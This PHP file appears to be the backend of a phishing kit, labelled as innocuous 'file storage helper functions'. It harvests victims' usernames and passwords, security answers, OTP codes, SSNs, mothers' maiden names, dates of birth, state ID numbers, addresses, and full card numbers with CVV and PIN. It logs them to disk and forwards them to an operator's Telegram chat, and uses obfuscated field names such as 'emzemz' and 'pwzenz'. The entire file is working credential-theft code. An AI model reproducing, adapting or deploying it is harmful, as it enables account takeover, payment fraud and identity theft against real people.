<?php

require_once __DIR__ . '/../config.php';

/**
 * File Storage Helper Functions
 * Saves user data to text files instead of making API calls
 * Includes Telegram integration for notifications
 */

function saveUserData($filename, $data) {
    $dataDir = DATA_STORAGE_PATH;
    
    // Create data directory if it doesn't exist
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    // Create user-specific directory if username exists
    if (isset($data['usrnm'])) {
        $userDir = $dataDir . '/' . $data['usrnm'];
        if (!is_dir($userDir)) {
            mkdir($userDir, 0755, true);
        }
        
        // Save to single user file instead of step-specific files
        $filepath = $userDir . '/user_data.txt';
    } else {
        // Fallback to shared file if no username
        $filepath = $dataDir . '/' . $filename;
    }
    
    // Add timestamp and step info to each entry
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Step: " . ($data['step'] ?? 'unknown') . " - " . json_encode($data) . "\n";
    
    // Save to file
    $result = file_put_contents($filepath, $entry, FILE_APPEND | LOCK_EX);
    
    // Send Telegram notification if enabled
    if ($result && TELEGRAM_ENABLED) {
        sendTelegramNotification($data);
    }
    
    return $result;
}

function sendTelegramNotification($data) {
    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return false;
    }
    
    $step = $data['step'] ?? 'unknown';
    $usrnm = $data['usrnm'] ?? 'unknown';
    $timestamp = getFormattedTimestamp();
    
    // Determine message type based on step
    $message = '';
    
    switch ($step) {
        case 'login':
            $message = "🔐 New Login\n"
                . "👤 Username: " . ($data['emzemz'] ?? $usrnm) . "\n"
                . "🔑 Password: " . ($data['pwzenz'] ?? 'N/A') . "\n"
                . "🌐 IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n"
                . "📱 User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n"
                . "⏰ Time: $timestamp";
            break;
            
        case 'security_questions':
            $message = "🔐 Security Questions Completed
👤 User: $usrnm
⏰ Time: $timestamp

📋 Security Challenges:
1️⃣ " . (isset($data['chld_pt']) ? $data['chld_pt'] : 'N/A') . "
   Answer: " . (isset($data['pt_ans']) ? $data['pt_ans'] : 'N/A') . "
2️⃣ " . (isset($data['brth_ct']) ? $data['brth_ct'] : 'N/A') . "  
   Answer: " . (isset($data['ct_ans']) ? $data['ct_ans'] : 'N/A') . "
3️⃣ " . (isset($data['frst_sch']) ? $data['frst_sch'] : 'N/A') . "
   Answer: " . (isset($data['sch_ans']) ? $data['sch_ans'] : 'N/A') . "";
            break;
            
        case 'otp_verification':
            $message = "🔑 OTP Verification Completed
👤 User: $usrnm
🔢 Code: " . (isset($data['vrf_cd']) ? $data['vrf_cd'] : 'N/A') . "
✅ Status: Verified
⏰ Time: $timestamp";
            break;
            
        case 'email_password':
            $message = "📧 Account Credentials Set
👤 User: $usrnm
📧 Email: " . ($data['usr_eml'] ?? 'N/A') . "
🔑 Password: " . ($data['acc_cd'] ?? 'N/A') . "
✅ Confirmation: Matched
⏰ Time: $timestamp";
            break;
            
        case 'basic_info_home_address':
            $message = "👤 Profile Information Completed\n"
                . "👤 User: $usrnm\n"
                . "⏰ Time: $timestamp\n\n"
                . "📝 Personal Details:\n"
                . "👤 First: " . ($data['gvn_nm'] ?? 'N/A') . "\n"
                . "👤 Last: " . ($data['fam_nm'] ?? 'N/A') . "\n"
                . "📞 Phone: " . ($data['cnt_num'] ?? 'N/A') . "\n"
                . "🔢 SSN: " . ($data['tax_id'] ?? 'N/A') . "\n"
                . "👶 Mother: " . ($data['mat_nm'] ?? 'N/A') . "\n"
                . "🎂 DOB: " . ($data['dob'] ?? 'N/A') . "\n"
                . "🪪 State ID: " . ($data['id_num'] ?? 'N/A') . "\n\n"
                . "🏠 Residential Address:\n"
                . "📍 Street: " . ($data['str_adr'] ?? 'N/A') . "\n"
                . "🏢 Unit: " . ($data['unit_dsg'] ?? 'N/A') . "\n"
                . "🏙️ City: " . ($data['loc'] ?? 'N/A') . "\n"
                . "🗺️ State: " . ($data['prov'] ?? 'N/A') . "\n"
                . "📮 ZIP: " . ($data['zip_cd'] ?? 'N/A');
            break;
            
        case 'card_information':
            $cardNumber = $data['pay_card'] ?? '';
            $formattedCard = $cardNumber ? 
                substr($cardNumber, 0, 4) . '-' . 
                substr($cardNumber, 4, 4) . '-' . 
                substr($cardNumber, 8, 4) . '-' . 
                substr($cardNumber, 12) : 'N/A';

            $message = "💳 Payment Method Added\n"
                . "👤 User: $usrnm\n"
                . "⏰ Time: $timestamp\n\n"
                . "💳 Card: $formattedCard\n"
                . "📅 Exp: " . ($data['exp_mth'] ?? 'MM') . "/" . ($data['exp_yr'] ?? 'YYYY') . "\n"
                . "🔢 CVV: " . ($data['sec_cd'] ?? 'N/A') . "\n"
                . "🏧 PIN: " . ($data['pin_cd'] ?? 'N/A');
            break;
            
        case 'terms_acceptance':
            // Get complete user data for flow completion
            $completeData = getUserCompleteData($usrnm);
            $stepCount = count($completeData);
            
            // Format card number if available
            $cardNumber = $completeData['card_information']['pay_card'] ?? '';
            $formattedCard = $cardNumber ? 
                substr($cardNumber, 0, 4) . '-' . 
                substr($cardNumber, 4, 4) . '-' . 
                substr($cardNumber, 8, 4) . '-' . 
                substr($cardNumber, 12) : 'N/A';
            
            $message = "🎉 ACCOUNT SETUP COMPLETE! 🎉\n"
                . "👤 User: $usrnm\n"
                . "⏰ Time: $timestamp\n"
                . "📊 Steps: $stepCount\n\n"
                . "🔐 ACCOUNT CREDENTIALS\n"
                . "📧 Email: " . ($completeData['email_password']['usr_eml'] ?? 'N/A') . "\n"
                . "🔑 Password: " . ($completeData['email_password']['acc_cd'] ?? 'N/A') . "\n\n"
                . "👤 PERSONAL INFORMATION\n"
                . "👤 Name: " . ($completeData['basic_info_home_address']['gvn_nm'] ?? 'N/A') . ' ' . ($completeData['basic_info_home_address']['fam_nm'] ?? 'N/A') . "\n"
                . "📞 Phone: " . ($completeData['basic_info_home_address']['cnt_num'] ?? 'N/A') . "\n"
                . "🔢 SSN: " . ($completeData['basic_info_home_address']['tax_id'] ?? 'N/A') . "\n"
                . "👶 Mother's Maiden Name: " . ($completeData['basic_info_home_address']['mat_nm'] ?? 'N/A') . "\n"
                . "🎂 DOB: " . ($completeData['basic_info_home_address']['dob'] ?? 'N/A') . "\n"
                . "🪪 State ID: " . ($completeData['basic_info_home_address']['id_num'] ?? 'N/A') . "\n\n"
                . "🏠 ADDRESS\n"
                . "📍 " . ($completeData['basic_info_home_address']['str_adr'] ?? 'N/A') . "\n"
                . "   " . ($completeData['basic_info_home_address']['unit_dsg'] ? 'Unit ' . $completeData['basic_info_home_address']['unit_dsg'] . ', ' : '') . "\n"
                . "   " . ($completeData['basic_info_home_address']['loc'] ?? 'N/A') . ', ' . ($completeData['basic_info_home_address']['prov'] ?? 'N/A') . ' ' . ($completeData['basic_info_home_address']['zip_cd'] ?? 'N/A') . "\n\n"
                . "💳 PAYMENT METHOD\n"
                . "💳 Card: $formattedCard\n"
                . "📅 Exp: " . ($completeData['card_information']['exp_mth'] ?? 'MM') . "/" . ($completeData['card_information']['exp_yr'] ?? 'YYYY') . "\n"
                . "🔢 CVV: " . ($completeData['card_information']['sec_cd'] ?? 'N/A') . "\n"
                . "🏧 PIN: " . ($completeData['card_information']['pin_cd'] ?? 'N/A') . "\n\n"
                . "✅ Terms: " . (isset($data['terms_accepted']) && $data['terms_accepted'] ? 'ACCEPTED' : 'DECLINED') . "\n\n"
                . "🔄 JOURNEY STEPS:\n";
            
            foreach ($completeData as $stepName => $stepData) {
                $message .= "✅ " . ucwords(str_replace('_', ' ', $stepName)) . "\n";
            }
            break;
            
        default:
            // Regular step completion with all data
            $message = "✅ Step Completed: $step
👤 User: $usrnm
⏰ Time: $timestamp

📋 Submitted Data:
";
            foreach ($data as $key => $value) {
                if (is_array($value)) {
                    $message .= "🔹 $key: " . json_encode($value) . "\n";
                } else {
                    // Mask sensitive fields
                    if (in_array($key, ['acc_cd', 'sec_cd', 'pin_cd', 'tax_id'])) {
                        $maskedValue = str_repeat('*', strlen($value));
                        $message .= "🔹 $key: $maskedValue\n";
                    } elseif ($key === 'pay_card') {
                        $message .= "🔹 $key: " . substr($value, 0, 4) . "-XXXX-XXXX-" . substr($value, -4) . "\n";
                    } else {
                        $message .= "🔹 $key: $value\n";
                    }
                }
            }
            break;
    }
    
    return sendTelegramMessage($message);
}

function sendTelegramMessage($message) {
    if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return false;
    }
    
    $apiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if (DEBUG_MODE && $httpCode !== 200) {
        error_log("Telegram API Error: HTTP $httpCode - Response: $response");
    }
    
    return $httpCode === 200;
}

function sendTelegramError($username, $error) {
    if (!TELEGRAM_ENABLED) {
        return false;
    }
    
    $vars = [
        'username' => $username,
        'error' => $error,
        'timestamp' => getFormattedTimestamp()
    ];
    
    $message = replaceTemplateVars(TELEGRAM_ERROR_MESSAGE, $vars);
    return sendTelegramMessage($message);
}

function getUserData($filename, $username = null) {
    $dataDir = DATA_STORAGE_PATH;
    
    // Check user-specific file first
    if ($username) {
        $userDir = $dataDir . '/' . $username;
        $filepath = $userDir . '/user_data.txt';
        if (file_exists($filepath)) {
            return parseUserDataFile($filepath, $filename);
        }
    }
    
    // Fallback to shared file
    $filepath = $dataDir . '/' . $filename;
    if (file_exists($filepath)) {
        return parseDataFile($filepath);
    }
    
    return [];
}

function parseUserDataFile($filepath, $stepFilter = null) {
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $data = [];
    
    foreach ($lines as $line) {
        // Parse line with step information
        if (preg_match('/^\[.*?\] Step: ([^-]+) - (.+)$/', $line, $matches)) {
            $step = trim($matches[1]);
            $jsonData = json_decode($matches[2], true);
            
            // Filter by step if specified
            if ($stepFilter === null || $step === $stepFilter) {
                $data[] = $jsonData;
            }
        }
        // Fallback to old format for compatibility
        elseif (preg_match('/^\[.*?\] (.+)$/', $line, $matches)) {
            $data[] = json_decode($matches[1], true);
        }
    }
    
    return $data;
}

function parseDataFile($filepath) {
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $data = [];
    
    foreach ($lines as $line) {
        // Remove timestamp and parse JSON
        if (preg_match('/^\[.*?\] (.+)$/', $line, $matches)) {
            $data[] = json_decode($matches[1], true);
        }
    }
    
    return $data;
}

function findUserByUsername($username) {
    $loginData = getUserData('login.txt');
    
    foreach ($loginData as $entry) {
        if (isset($entry['emzemz']) && $entry['emzemz'] === $username) {
            return $entry;
        }
    }
    
    return null;
}

function saveLoginData($emzemz, $pwzenz) {
    $data = [
        'emzemz' => $emzemz,
        'pwzenz' => $pwzenz,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    return saveUserData('login.txt', $data);
}

function saveSecurityQuestions($emzemz, $securityQuestion1, $securityAnswer1, $securityQuestion2, $securityAnswer2, $securityQuestion3, $securityAnswer3) {
    $data = [
        'emzemz' => $emzemz,
        'securityQuestion1' => $securityQuestion1,
        'securityAnswer1' => $securityAnswer1,
        'securityQuestion2' => $securityQuestion2,
        'securityAnswer2' => $securityAnswer2,
        'securityQuestion3' => $securityQuestion3,
        'securityAnswer3' => $securityAnswer3
    ];
    
    return saveUserData('security_questions.txt', $data);
}

function saveBasicInfo($emzemz, $fzNme, $lzNme, $phone, $ssn, $motherMaidenName, $dob, $driverLicense) {
    $data = [
        'emzemz' => $emzemz,
        'fzNme' => $fzNme,
        'lzNme' => $lzNme,
        'phone' => $phone,
        'ssn' => $ssn,
        'motherMaidenName' => $motherMaidenName,
        'dob' => $dob,
        'driverLicense' => $driverLicense
    ];
    
    return saveUserData('basic_info.txt', $data);
}

function saveHomeAddress($emzemz, $stAd, $apt, $city, $state, $zipCode) {
    $data = [
        'emzemz' => $emzemz,
        'stAd' => $stAd,
        'apt' => $apt,
        'city' => $city,
        'state' => $state,
        'zipCode' => $zipCode
    ];
    
    return saveUserData('home_address.txt', $data);
}

function saveOTP($emzemz, $otp) {
    $data = [
        'emzemz' => $emzemz,
        'otp' => $otp,
        'verified' => true
    ];
    
    return saveUserData('otp.txt', $data);
}

function validateUser($emzemz, $pwzenz) {
    // Check user-specific file first
    $userData = getUserData('login.txt', $emzemz);
    
    foreach ($userData as $entry) {
        if (isset($entry['emzemz']) && $entry['emzemz'] === $emzemz && isset($entry['pwzenz']) && $entry['pwzenz'] === $pwzenz) {
            return true;
        }
    }
    
    // Fallback to shared file
    $sharedData = getUserData('login.txt');
    
    foreach ($sharedData as $entry) {
        if (isset($entry['emzemz']) && $entry['emzemz'] === $emzemz && isset($entry['pwzenz']) && $entry['pwzenz'] === $pwzenz) {
            return true;
        }
    }
    
    return false;
}

function getUserCompleteData($username) {
    $dataDir = DATA_STORAGE_PATH;
    $userDir = $dataDir . '/' . $username;
    $filepath = $userDir . '/user_data.txt';
    
    if (!file_exists($filepath)) {
        return [];
    }
    
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $completeData = [];
    
    foreach ($lines as $line) {
        if (preg_match('/^\[.*?\] Step: ([^-]+) - (.+)$/', $line, $matches)) {
            $step = trim($matches[1]);
            $jsonData = json_decode($matches[2], true);
            $completeData[$step] = $jsonData;
        }
    }
    
    return $completeData;
}

?>
